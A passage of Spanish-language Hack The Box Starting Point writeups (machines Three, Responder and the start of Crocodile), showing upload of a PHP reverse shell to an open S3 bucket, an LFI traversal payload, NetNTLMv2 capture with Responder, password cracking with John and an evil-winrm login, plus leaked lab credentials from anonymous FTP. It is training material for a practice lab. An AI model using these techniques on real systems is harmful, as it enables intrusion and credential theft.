ello.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ locate directory-list/usr/share/dirbuster/wordlists/directory-list-1.0.txt/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt/usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt/usr/share/whatweb/plugins/simple-directory-listing.rbUtilizamos feroxbuster con /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt como diccionario.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ feroxbuster -u http://s3.thetoppers.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e -t 100 -o feroxbuster_output ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben \"epi\" Risher 🤓 ver: 2.7.0───────────────────────────┬────────────────────── 🎯 Target Url │ http://s3.thetoppers.htb/ 🚀 Threads │ 100 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.7.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💾 Output File │ feroxbuster_output 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────200 GET 1l 72w 887c http://s3.thetoppers.htb/health200 GET 0l 0w 0c http://s3.thetoppers.htb/shell405 GET 4l 23w 178c http://s3.thetoppers.htb/graph500 GET 1l 1w 2c http://s3.thetoppers.htb/shellcode500 GET 1l 1w 2c http://s3.thetoppers.htb/shells500 GET 1l 1w 2c http://s3.thetoppers.htb/shellscripts500 GET 1l 1w 2c http://s3.thetoppers.htb/shellen500 GET 1l 1w 2c http://s3.thetoppers.htb/shellcity500 GET 1l 1w 2c http://s3.thetoppers.htb/shell_screenshot500 GET 1l 1w 2c http://s3.thetoppers.htb/shell01500 GET 1l 1w 2c http://s3.thetoppers.htb/shell02500 GET 1l 1w 2c http://s3.thetoppers.htb/shelley500 GET 1l 1w 2c http://s3.thetoppers.htb/shell-scripts[####################] - 28m 87650/87650 0s found:13 errors:0[####################] - 28m 87650/87650 51/s http://s3.thetoppers.htb/Significado de las flags: -u : la URL que queremos escanear. -w : la ubicación de nuestro fichero de wordlist. -e : le pedimos que extraiga enlaces del cuerpo de la respuesta y realice nuevas peticiones en función de los resultados. -t : nro de hilos concurrentes. -o : nombre del fichero donde almacenaremos la salida.Probamos la URL http://s3.thetoppers.htb/health desde el navegador.OK, nada interesante. Vamos a interactuar con este bucket s3 desde nuestra consola. Para ello abrimos el cliente de aws. Si no lo tenéis instalado: sudo apt install awscliEjecutamos aws para intentar listar los recursos que pueda haber en http://s3.thetoppers.htb┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ aws s3 ls s3://thetoppers.htbUnable to locate credentials. You can configure credentials by running \"aws configure\".El cliente de aws nos dice que no se puede conectar porque no tenemos las credenciales necesarias configuradas en nuestro equipo. Nos sugiere que ejecutemos aws configure.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ aws configureAWS Access Key ID [None]:Pequeño inconveniente: no disponemos del AWS Access Key ID :(Lo dejamos vacío y hacemos lo mismo con el resto de parámetros de configuracion que nos solicita el cli dando al Enter directamente. Volvemos a probar listar el bucket.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ aws configureAWS Access Key ID [None]:AWS Secret Access Key [None]:Default region name [None]:Default output format [None]:┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ aws s3 ls s3://thetoppers.htbUnable to locate credentials. You can configure credentials by running \"aws configure\".OK, por lo visto no hay forma de listar el bucket sin disponer de las credenciales correspondientes.Trasteamos desde el navegador por lo directorios que nos ha volcado feroxbuster a ver si encontramos algo.Nada.Volvemos a leer con más optimismo el mensaje que nos ha devuelto el cli de aws tras haber dejado vacíos los parámetros de configuración. En principio no nos dice nada sobre que sean erróneos, simplemente refiere Unable to locate credentials. Probamos a meter cualquier cosa a ver que pasa.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ aws configureAWS Access Key ID [None]: qweAWS Secret Access Key [None]: qweDefault region name [None]: qweDefault output format [None]: qwe┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ aws s3 ls s3://thetoppers.htbCould not connect to the endpoint URL: \"https://s3.a.amazonaws.com/thetoppers.htb?list-type=2&amp;prefix=&amp;delimiter=%2F&amp;encoding-type=url\"OK, no hemos conseguido listar nada, pero al menos ha cambiado el mensaje de error. Probamos a pasarle al cli la URL de nuestro endpoint.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb PRE images/2022-08-10 21:09:54 0 .htaccess2022-08-10 21:09:54 11952 index.phpMejor. Una vez que hemos conseguido listarlo toca ver qué otras cosas podemos hacer con el bucket. Miramos aquí y damos con esto.Especial atención a:aws s3 cp/mv test-file.txt s3://bucket-nameSegún ésto, podríamos copiar (aka subir) un fichero desde nuestro equipo al bucket. Interesante. Probamos con algo inofensivo para empezar.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ touch a.txt┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ echo \"Hola que tal\" &gt; a.txt┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ cat a.txtHola que tal┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ aws s3 --endpoint=http://s3.thetoppers.htb cp a.txt s3://thetoppers.htbupload: ./a.txt to s3://thetoppers.htb/a.txtProbamos desde el browser a cargar la URL http://thetoppers.htb/a.txtFunciona. Vamos a por algo más interesante que un txt, una shell reversa por ejemplo.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ locate php-reverse-shell/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php/usr/share/webshells/php/php-reverse-shell.php┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ cp /usr/share/webshells/php/php-reverse-shell.php .La editamos con los datos correctos.[...]$ip = '10.10.xx.xx'; // CHANGE THIS &lt;- nuestra IP local$port = 4321; // CHANGE THIS &lt;- el puerto en el que estaremos escuchando[...]La subimos al bucket┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ aws s3 --endpoint=http://s3.thetoppers.htb cp php-reverse-shell.php s3://thetoppers.htbupload: ./php-reverse-shell.php to s3://thetoppers.htb/php-reverse-shell.phpAbrimos una pestaña nueva en nuestro terminal e iniciamos netcat poniéndolo a escuchar en el puerto que hemos configurado en el fichero de la shell.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ nc -lvnp 4321listening on [any] 4321 ...Significado de las flags: -l : listen mode. -v : verbose. -n : solo IP numéricas, no DNS. -p : nro de puerto local.Cargamos en el browser http://thetoppers.htb/php-reverse-shell.php  y volvemos al netcat┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ nc -lvnp 4321listening on [any] 4321 ...connect to [10.10.xx.xx] from (UNKNOWN) [10.129.71.219] 42754Linux three 4.15.0-189-generic #200-Ubuntu SMP Wed Jun 22 19:53:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux 21:46:40 up 3:08, 0 users, load average: 1.01, 1.76, 1.78USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$Bien. Toca trastear.[...]/bin/sh: 0: can't access tty; job control turned off$ pwd/$ ls -latotal 92drwxr-xr-x 22 root root 4096 Jul 19 12:19 .drwxr-xr-x 22 root root 4096 Jul 19 12:19 ..drwxr-xr-x 2 root root 4096 Jul 19 12:19 bindrwxr-xr-x 4 root root 4096 Jul 19 12:08 bootdrwxr-xr-x 19 root root 3880 Aug 10 18:37 devdrwxr-xr-x 107 root root 4096 Aug 1 14:48 etcdrwxr-xr-x 3 root root 4096 Jul 19 12:19 homelrwxrwxrwx 1 root root 34 Jul 19 12:05 initrd.img -&gt; boot/initrd.img-4.15.0-189-genericlrwxrwxrwx 1 root root 34 Jul 19 12:08 initrd.img.old -&gt; boot/initrd.img-4.15.0-189-genericdrwxr-xr-x 22 root root 4096 Jul 19 11:59 libdrwxr-xr-x 2 root root 4096 Jul 19 12:19 lib64drwx------ 2 root root 16384 Apr 12 18:39 lost+founddrwxr-xr-x 2 root root 4096 Jul 19 12:19 mediadrwxr-xr-x 2 root root 4096 Jul 19 12:19 mntdrwxrwxrwx 4 root root 4096 Apr 12 20:19 optdr-xr-xr-x 131 root root 0 Aug 10 18:37 procdrwx------ 8 root root 4096 Aug 1 14:49 rootdrwxr-xr-x 30 root root 980 Aug 10 18:38 rundrwxr-xr-x 2 root root 12288 Jul 19 12:00 sbindrwxr-xr-x 2 root root 4096 Aug 6 2020 srvdr-xr-xr-x 13 root root 0 Aug 10 18:37 sysdrwxrwxrwt 2 root root 4096 Aug 10 18:37 tmpdrwxr-xr-x 10 root root 4096 Aug 6 2020 usrdrwxr-xr-x 13 root root 4096 Jul 19 11:57 varlrwxrwxrwx 1 root root 31 Jul 19 12:05 vmlinuz -&gt; boot/vmlinuz-4.15.0-189-genericlrwxrwxrwx 1 root root 31 Jul 19 12:08 vmlinuz.old -&gt; boot/vmlinuz-4.15.0-189-generic$ cd var$ lsbackupscachecrashliblocallocklogmailoptrunspooltmpwww$ cd www$ lsflag.txthtml$ cat flag.txtxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$Box resuelto.Espero que os haya resultado útil.Sed buenos de no haber opción mejor.Respuestas: Task 1: 2 Task 2: thetoppers.htb Task 3: /etc/hosts Task 4: s3.thetoppers.htb Task 5: Amazon S3 Task 6: awscli Task 7: aws configure Task 8: aws s3 ls Task 9: php" }, { "title": "Hack The Box - Starting Point - Tier 1 - Responder Writeup", "url": "/posts/htb-writeup-tier1-responder/", "categories": "Hack The Box", "tags": "htb, writeups", "date": "2022-08-10 02:30:00 +0100", "snippet": "Este post forma parte de la serie Tier 1 del Starting Point de HTB que iniciamos aquí.ResponderEl primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)Copiamos la IP del equipo remoto, en mi caso 10.129.162.134, y lanzamos un nmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ nmap -A 10.129.162.134 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-10 19:45 CESTNmap scan report for 10.129.162.134Host is up (0.042s latency).Not shown: 999 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1|_http-title: Site doesn't have a title (text/html; charset=UTF-8).Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.04 secondsSignificado de las flags: -A : escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón. -oN : imprime la salida en un fichero de texto con el nombre nmap_outputRespondemos la pregunta de la primer task con un 1 y nos da error. Hay más puertos.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ nmap -A -p- 10.129.162.134 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-10 19:48 CESTNmap scan report for 10.129.162.134Host is up (0.041s latency).Not shown: 65533 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)|_http-title: Site doesn't have a title (text/html; charset=UTF-8).|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.15985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.0Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 129.08 secondsSignificado de las flags: -p- : para escanear los 65535 puertos.Ahora si. Tenemos 2 puertos escuchando sobre un OS Windows.Vamos a por el 80/tcp desde el navegador por IP.No rula. Miramos el mensaje con atención. Toca modificar el fichero etc/hosts  de nuestro equipo para resolver la IP añadiendo la siguiente entrada.10.129.162.134\tunika.htbReintentamos.Trasteamos con el sitio: vemos código fuente, probamos el menú, cambiamos idioma …OK, aquí hay algo. La URL que se genera con cada cambio de idioma nos llama la atención:http://unika.htb/index.php?page=french.htmlhttp://unika.htb/index.php?page=german.htmlPor qué ? porque el parámetro GET page podría darnos la posibilidad de explotar una vulnerabilidad de tipo Local File Include (LFI).Y qué es LFI ? En pocas palabras (googlear los que queráis profundizar): Imaginemos un par de páginas php con los nombres a.php y b.php con el siguiente código cada una:# codigo de a.php&lt;?phpecho \"Hola y \";include 'b.php';?&gt;############################################## codigo de b.php&lt;?phpecho \"adios.\";?&gt; La sentencia include en PHP permite “incrustar” el archivo que le pasemos como parámetro. En nuestro ejemplo, la página a.php incluirá el codigo de b.php. El resultado de cargar en un navegador la URL https://unaweb.com/a.php será:Hola y adios. La sentencia include busca los archivos en base a la ruta que le demos como parámetro. En nuestro ejemplo, a.php y b.php estan en el mismo directorio, pero b.php podría estar en otra ubicación, por encima o por debajo de donde se encuentra a.php.# codigo de a.php modificado&lt;?phpecho \"Hola y \";# b.php esta un directorio por debajo respecto de a.php, en la carpeta saludos/include 'saludos/b.php';# c.php esta un directorio por encima de donde se encuentra a.phpinclude '../c.php';?&gt; Las rutas en este caso son relativas al directorio de a.php, pero podrían ser absolutas, apuntando a cualquier fichero del servidor. Hasta aquí hemos utilizado un valor establecido en código para el parámetro que pasamos a la sentencia include en a.php. Otra opción es tomarlo desde la URL, mediante un GET. # codigo de a.php&lt;?phpecho \"Hola y \";include $_GET[‘pagina’];?&gt;############################################## codigo de b.php&lt;?phpecho \"adios.\";?&gt; Ahora si cargamos la URL https://unaweb.com/a.php?pagina=b.php obtendremos el mismo resultado que antes. A todas luces ésta codificación resulta poco segura. Si el valor de pagina que pasamos en el GET apunta a un fichero que no existe, el sitio nos mostrará un Warning avisándonos de ello. Si el fichero existe, nos mostrará su contenido. Probemos la teoría que acabamos de exponer e intentemos cargar la siguiente URL a ver qué pasa.http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hostsResultado:Bien. Vulnerabilidad LFI confirmada. Tenemos algo por donde avanzar. Y lo que vamos a intentar es capturar el hash NetNTLMv2 del administrador utilizando responder.Veamos el proceso con un poco de detalle antes de seguir. Aprovechándonos de LFI vamos a pedirle al servidor que se conecte mediante el protocolo SMB a un recurso ‘supuestamente’ disponible en nuestra máquina local. Ante esta petición, el Windows corriendo en el servidor intentará autenticarse en nuestra máquina local mediante el protocolo NTLM (New Technology Lan Manager), un protocolo de autenticación desafío-respuesta creado por Microsoft. El protocolo NTLM, para hacer la autenticación a través de la red mediante el modelo desafío-respuesta, creará una cadena específicamente formateada para incluir el desafío y la respuesta llamada NetNTLMv2. A menudo se denomina a esta cadena hash NetNTLMv2 porque la atacamos de la misma manera, si bien no es un hash como tal. Con responder vamos a intentar capturar este hash, probar a crakearlo con John The Ripper y ver luego en para qué podemos utilizarlo. Vamos a ello.Lo primero será iniciar responder poniéndolo a escuhar en la interfaz por la que estamos conectados con el server via VPN. Cuál esa interfaz ?┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ ifconfig[...]tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu 1500 inet 10.10.xx.xx netmask 255.255.254.0 destination 10.10.xx.xx inet6 dead:beef:4::10d7 prefixlen 64 scopeid 0x0&lt;global&gt; inet6 fe80::da05:xxxx:xxxx:xxxx prefixlen 64 scopeid 0x20&lt;link&gt; unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 500 (UNSPEC) RX packets 2542 bytes 2751464 (2.6 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 135726 bytes 8149968 (7.7 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0tun0 es la interfaz, y 10.10.xx.xx la IP con la que nos ve el servidor remoto.Iniciamos responder como root con el flag -I  para indicarle la interfaz donde queremos que se ponga a escuchar.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─# responder -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0 To support this project: Patreon -&gt; https://www.patreon.com/PythonResponder Paypal -&gt; https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C[+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] DHCP [OFF][+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON][+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF][+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Force ESS downgrade [OFF][+] Generic Options: Responder NIC [tun0] Responder IP [10.10.xx.xx] Responder IPv6 [dead:beef:4::10d7] Challenge set [random] Don't Respond To Names ['ISATAP'][+] Current Session Variables: Responder Machine Name [WIN-UOOC6QT03DP] Responder Domain Name [2HZ9.LOCAL] Responder DCE-RPC Port [47770][+] Listening for events...Volvemos al browser y cargamos la siguiente URL:http://unika.htb/?page=//10.10.xx.xx/cualquiercosaCon ésto estamos pasando al server la instrucción de acceder al recurso “cualquiercosa” disponible en un equipo remoto (el nuestro: 10.10.xx.xx) via SMB. Volvemos a nuestro terminal con el responder.[...][+] Listening for events...[SMB] NTLMv2-SSP Client : 10.129.162.134[SMB] NTLMv2-SSP Username : RESPONDER\\Administrator[SMB] NTLMv2-SSP Hash : Administrator::RESPONDER:391cb4aa715056cingo ! … responder ha capturado el hash enviado por Windows desde el server remoto ([SMB] NTLMv2-SSP Client: 10.129.162.134) a nuestro recurso local //10.10.xx.xx/cualquiercosa con el objetivo de autenticarse.Turno de john. Copiamos el valor del Hash NTLMv2 a un fichero nuevo y guardamos. Utilizamos rockyou.txt como diccionario.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ john --wordlist=/usr/share/wordlists/rockyou.txt responder.hashUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusbadminton (Administrator)1g 0:00:00:00 DONE (2022-08-10 20:11) 50.00g/s 204800p/s 204800c/s 204800C/s slimshady..ooooooUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completed.OK. Hemos conseguido la password de Administrator a partir del hash capturado.Qué hacemos con esto ? Si repasamos el volcado de nmap vemos que además del puerto 80/tcp el servidor tiene abierto el 5985/tcp.Googleamos. Nos enteramos aquí que el puerto en cuestión esta asociado al servicio winrm: WinRM 2.0 (Microsoft Windows Remote Management) uses port 5985/tcp for HTTP and 5986/tcp for HTTPS by default.Googleamos posibles formas de explotar este servicio. Damos con info interesante aquí (parte 1) y aquí (parte 2). Nota: los más ansiosos pueden recurrir aquí directamente.Bien, necesitamos tirar de evil-winrm. Si no lo tenemos, lo instalamos (está disponible en el repositorio de Kali).evil-winrm, una vez conectado, nos va a proveer de una shell con la que podremos trastear por el server remoto en búsqueda de nuestra flag.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ evil-winrm -i 10.129.162.134 -u administrator -p badmintonEvil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; dir*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cd ..*Evil-WinRM* PS C:\\Users\\Administrator&gt; cd Desktop*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; dir*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; cd ..*Evil-WinRM* PS C:\\Users\\Administrator&gt; cd ..*Evil-WinRM* PS C:\\Users&gt; dir Directory: C:\\UsersMode LastWriteTime Length Name---- ------------- ------ ----d----- 3/9/2022 5:35 PM Administratord----- 3/9/2022 5:33 PM miked-r--- 10/10/2020 12:37 PM Public*Evil-WinRM* PS C:\\Users&gt; cd mike*Evil-WinRM* PS C:\\Users\\mike&gt; dir Directory: C:\\Users\\mikeMode LastWriteTime Length Name---- ------------- ------ ----d----- 3/10/2022 4:51 AM Desktop*Evil-WinRM* PS C:\\Users\\mike&gt; cd Desktop*Evil-WinRM* PS C:\\Users\\mike\\Desktop&gt; dir Directory: C:\\Users\\mike\\DesktopMode LastWriteTime Length Name---- ------------- ------ -----a---- 3/10/2022 4:50 AM 32 flag.txt*Evil-WinRM* PS C:\\Users\\mike\\Desktop&gt; cat flag.txtxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx*Evil-WinRM* PS C:\\Users\\mike\\Desktop&gt;Conseguido.Respuestas: Task 1: 2 Task 2: unika.htb Task 3: php Task 4: page Task 5: ../../../../../../../../windows/system32/drivers/etc/hosts Task 6: //10.10.14.6/somefile Task 7: New Technology Lan Manager Task 8: -I Task 9: John The Ripper Task 10: badminton Task 11: 5985" }, { "title": "Hack The Box - Starting Point - Tier 1 - Crocodile Writeup", "url": "/posts/htb-writeup-tier1-crocodile/", "categories": "Hack The Box", "tags": "htb, writeups", "date": "2022-08-10 02:20:00 +0100", "snippet": "Este post forma parte de la serie Tier 1 del Starting Point de HTB que iniciamos aquí.CrocodileEl primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)Copiamos la IP del equipo remoto, en mi caso 10.129.58.242, y lanzamos un nmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ nmap -A 10.129.58.242 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 20:32 CESTNmap scan report for 10.129.58.242Host is up (0.049s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst:| STAT:| FTP server status:| Connected to ::ffff:10.10.xx.xx| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist|_-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Smash - Bootstrap Business Template|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: UnixService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.70 secondsSignificado de las flags: -A : escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón. -oN : imprime la salida en un fichero de texto con el nombre nmap_outputOK. La salida nos cuenta que tenemos dos puertos abiertos con servicios escuchando: puerto 21/tcp (FTP) con un vsFTPd 3.0.3 detrás y lo más bonito:[...]|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist|_-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd[...] puerto 80/tcp (HTTP) con un Apache/2.4.41 (Ubuntu) detrás.Aprovechamos el ftp-anon y salimos de pesca.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ ftp 10.129.58.242Connected to 10.129.58.242.220 (vsFTPd 3.0.3)Name (10.129.58.242:ewan67): anonymous230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||49464|)150 Here comes the directory listing.-rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd226 Directory send OK.ftp&gt; get allowed.userlistlocal: allowed.userlist remote: allowed.userlist229 Entering Extended Passive Mode (|||43256|)150 Opening BINARY mode data connection for allowed.userlist (33 bytes).100% |*************************************************************************************************************************| 33 0.42 KiB/s 00:00 ETA226 Transfer complete.33 bytes received in 00:00 (0.17 KiB/s)ftp&gt; get allowed.userlist.passwdlocal: allowed.userlist.passwd remote: allowed.userlist.passwd229 Entering Extended Passive Mode (|||41270|)150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).100% |*************************************************************************************************************************| 62 1.66 KiB/s 00:00 ETA226 Transfer complete.62 bytes received in 00:00 (0.25 KiB/s)ftp&gt;Echamos un ojo a los ficheros que nos hemos descargado.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ cat allowed.userlistaronpwnmeowegotisticalswadmin┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ cat allowed.userlist.passwdrootSupersecretpassword1@BaASD&amp;9032123sADSrKXM59ESxesUFHAdUna relación de credenciales que podemos expresar así:aron:rootpwnmeow:Supersecretpassword1egotisticalsw:@BaASD&amp;9032123sADSadmin:rKXM59ESxesUFHAdEl FTP ha dado todo de sí. Abrimos un browser y apuntamos a la IP a ver qué nos cuenta el Apache del puerto 80.Bonita web. Trasteamos un poco con ella para conocerla mejor. Lanzamos un whatweb para más info.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB]└─$ whatweb -a 3 -v 10.129.58.242WhatWeb report for http://10.129.58.242Status : 200 OKTitle : Smash - Bootstrap Business TemplateIP : 10.129.58.242Country : RESERVED, ZZSummary : Apache[2.4.41], Bootstrap[3.3.7], Email[hello@ayroui.com,support@uideck.com], Frame, HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], JQuery[1.12.4], Modernizr[3.7.1.min], ScriptDetected Plugins:[ Apache ] The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows NT. The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services in sync with the current HTTP standards. Version : 2.4.41 (from HTTP Server Header) Google Dorks: (3) Website : http://httpd.apache.org/[ Bootstrap ] Bootstrap is an open source toolkit for developing with HTML, CSS, and JS. Version : 3.3.7 Version : 3.3.7 Website : https://getbootstrap.com/[...]Significado de las flags: -a : Set the aggression level. Default: 1. Nosotros le pasamos un 3 (Aggressive). -v : Verbose output includes plugin descriptions.Bien. Interesante info (un par de cuentas de correo incluidas) pero poco donde tirar. Pasamos a enumerar directorios a ver qué aparece.Lo primero, localizar en nuestra máquina una lista adecuada para utilizar de diccionario.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ locate directory-list/usr/share/dirbuster/wordlists/directory-list-1.0.txt/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt/usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt/usr/share/whatweb/plugins/simple-directory-listing.rbNos quedamos con esta:/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txtPara estas tareas suelo utilizar 